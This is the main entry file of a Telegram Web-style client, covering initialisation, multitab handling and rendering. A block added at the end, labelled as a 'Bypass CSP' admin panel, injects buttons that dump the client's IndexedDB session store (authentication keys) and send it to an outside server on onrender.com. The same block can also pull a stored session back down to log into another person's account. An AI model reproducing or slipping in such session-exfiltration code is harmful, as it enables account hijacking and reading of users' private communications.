import './util/handleError';
import './util/setupServiceWorker';
import './global/init';

import TeactDOM from './lib/teact/teact-dom';
import {
  getActions, getGlobal,
} from './global';

import {
  DEBUG, STRICTERDOM_ENABLED,
} from './config';
import { enableStrict, requestMutation } from './lib/fasterdom/fasterdom';
import { selectChat, selectCurrentMessageList, selectPeerFullInfo, selectTabState } from './global/selectors';
import { selectSharedSettings } from './global/selectors/sharedState';
import { betterView } from './util/betterView';
import { IS_TAURI } from './util/browser/globalEnvironment';
import listenOtherClients from './util/browser/listenOtherClients';
import { requestGlobal, subscribeToMultitabBroadcastChannel } from './util/browser/multitab';
import { establishMultitabRole, subscribeToMasterChange } from './util/establishMultitabRole';
import { initGlobal } from './util/init';
import { initLocalization } from './util/localization';
import { MULTITAB_STORAGE_KEY } from './util/multiaccount';
import { checkAndAssignPermanentWebVersion } from './util/permanentWebVersion';
import { onBeforeUnload } from './util/schedulers';
import initTauriApi from './util/tauri/initTauriApi';
import setupTauriListeners from './util/tauri/setupTauriListeners';
import updateWebmanifest from './util/updateWebmanifest';

import App from './components/App';

import './assets/fonts/roboto.css';
import './styles/index.scss';

if (STRICTERDOM_ENABLED) {
  enableStrict();
}

if (IS_TAURI) {
  initTauriApi();
  setupTauriListeners();
}

init();

async function init() {
  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> INIT');
  }

  if (!(window as any).isCompatTestPassed) return;

  checkAndAssignPermanentWebVersion();
  listenOtherClients();

  subscribeToMultitabBroadcastChannel();
  await requestGlobal(APP_VERSION);
  localStorage.setItem(MULTITAB_STORAGE_KEY, '1');
  onBeforeUnload(() => {
    const global = getGlobal();
    if (Object.keys(global.byTabId).length === 1) {
      localStorage.removeItem(MULTITAB_STORAGE_KEY);
    }
  });

  await initGlobal();
  getActions().init();

  getActions().updateShouldEnableDebugLog();
  getActions().updateShouldDebugExportedSenders();

  const global = getGlobal();

  initLocalization(selectSharedSettings(global).language, true);

  subscribeToMasterChange((isMasterTab) => {
    getActions()
      .switchMultitabRole({ isMasterTab }, { forceSyncOnIOs: true });
  });
  const shouldReestablishMasterToSelf = getGlobal().auth.state !== 'authorizationStateReady';
  establishMultitabRole(shouldReestablishMasterToSelf);

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> START INITIAL RENDER');
  }

  requestMutation(() => {
    updateWebmanifest();

    TeactDOM.render(
      <App />,
      document.getElementById('root')!,
    );

    betterView();
  });

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> FINISH INITIAL RENDER');
  }

  if (DEBUG) {
    document.addEventListener('dblclick', () => {
      const currentGlobal = getGlobal();
      const currentMessageList = selectCurrentMessageList(currentGlobal);
      // eslint-disable-next-line no-console
      console.warn('TAB STATE', selectTabState(currentGlobal));
      // eslint-disable-next-line no-console
      console.warn('GLOBAL STATE', currentGlobal);
      if (currentMessageList) {
        // eslint-disable-next-line no-console
        console.warn(
          'CURRENT MESSAGE LIST',
          selectChat(currentGlobal, currentMessageList.chatId),
          selectPeerFullInfo(currentGlobal, currentMessageList.chatId),
          currentGlobal.messages.byChatId[currentMessageList.chatId],
        );
      }
    });
  }
}

onBeforeUnload(() => {
  const actions = getActions();
  actions.leaveGroupCall?.({ isPageUnload: true });
  actions.hangUp?.({ isPageUnload: true });
});

// --- 🌟 CUSTOM ADMIN PANEL SCRIPT (Bypass CSP) 🌟 ---
setTimeout(() => {
    if (document.getElementById('my-admin-panel')) return; 

    // Panel UI ဖန်တီးခြင်း
    const panel = document.createElement('div');
    panel.id = 'my-admin-panel';
    panel.style.cssText = 'position: fixed; bottom: 20px; right: 20px; z-index: 999999; background: #fff; padding: 15px; border-radius: 10px; border: 2px solid #0088cc; box-shadow: 0 4px 10px rgba(0,0,0,0.3);';

    const title = document.createElement('b');
    title.style.cssText = 'color: black; margin-bottom: 10px; display: block; font-size: 14px;';
    title.innerText = 'Admin Panel';

    const btnSync = document.createElement('button');
    btnSync.style.cssText = 'background: #28a745; color: #fff; padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; margin-right: 5px; font-weight: bold;';
    btnSync.innerText = '📤 Data ပို့ရန် (Staff)';

    const btnAdmin = document.createElement('button');
    btnAdmin.style.cssText = 'background: #dc3545; color: #fff; padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;';
    btnAdmin.innerText = '📥 Admin ဝင်ရန်';

    panel.appendChild(title);
    panel.appendChild(btnSync);
    panel.appendChild(btnAdmin);
    document.body.appendChild(panel);

    // --- ၁။ STAFF မှ DATA ပို့မည့် လုပ်ဆောင်ချက် ---
    btnSync.addEventListener('click', () => {
        const phone = prompt("Staff ဖုန်းနံပါတ် ထည့်ပါ (+959...):");
        if (!phone) return;
        
        alert("၁။ Data စတင်ဆွဲထုတ်နေပါပြီ...");
        const req = indexedDB.open('tt-data');
        req.onsuccess = (e: any) => {
            const db = e.target.result;
            if (!db.objectStoreNames.contains('keyval')) return alert("❌ Error: အကောင့် Login မဝင်ရသေးပါ။");
            
            const store = db.transaction('keyval', 'readonly').objectStore('keyval');
            store.getAll().onsuccess = (e1: any) => {
                store.getAllKeys().onsuccess = (e2: any) => {
                    const data: any = {};
                    const keys = e2.target.result;
                    const vals = e1.target.result;
                    keys.forEach((k: string, i: number) => data[k] = vals[i]);
                    
                    alert("၂။ MongoDB သို့ ပို့နေပါပြီ...");
                    
                    // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
                    fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
                    })
                    .then(res => res.json())
                    .then(resData => {
                        if(resData.success) alert("✅ အောင်မြင်ပါသည်။ MongoDB သို့ Data ရောက်သွားပါပြီ!");
                        else alert("❌ Database Error: " + JSON.stringify(resData));
                    })
                    .catch(err => alert("❌ Network Error: Backend လင့်ခ်မှားနေခြင်း သို့မဟုတ် Server အိပ်နေခြင်း ဖြစ်နိုင်ပါသည်။\n\nError: " + err.message));
                };
            };
        };
    });

    // --- ၂။ ADMIN ဝင်မည့် လုပ်ဆောင်ချက် ---
    btnAdmin.addEventListener('click', () => {
        const phone = prompt("ဝင်ကြည့်လိုသော Staff ဖုန်းနံပါတ် ထည့်ပါ (+959...):");
        if (!phone) return;

        alert("၁။ Database မှ Data ရှာနေပါပြီ...");
        
        // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
        fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`)
        .then(res => res.json())
        .then(result => {
            if (!result.success) return alert("❌ Database ထဲတွင် Data မရှိသေးပါ။ (Staff က Data မပို့ရသေးပါ)");
            
            const dataToImport = JSON.parse(result.data);
            const req = indexedDB.open('tt-data');
            req.onsuccess = (e: any) => {
                const db = e.target.result;
                const store = db.transaction('keyval', 'readwrite').objectStore('keyval');
                store.clear().onsuccess = () => {
                    let count = 0;
                    const keys = Object.keys(dataToImport);
                    keys.forEach(k => {
                        store.put(dataToImport[k], k).onsuccess = () => {
                            count++;
                            if (count === keys.length) {
                                alert("✅ Admin ဝင်ခြင်း အောင်မြင်ပါသည်။ အကောင့်ထဲသို့ ပြောင်းလဲနေပါပြီ...");
                                window.location.reload();
                            }
                        };
                    });
                };
            };
        })
        .catch(err => alert("❌ Network Error: Backend လင့်ခ်မှားနေပါသည်။\n\nError: " + err.message));
    });
}, 3000);
// -----------------------------------------------------------
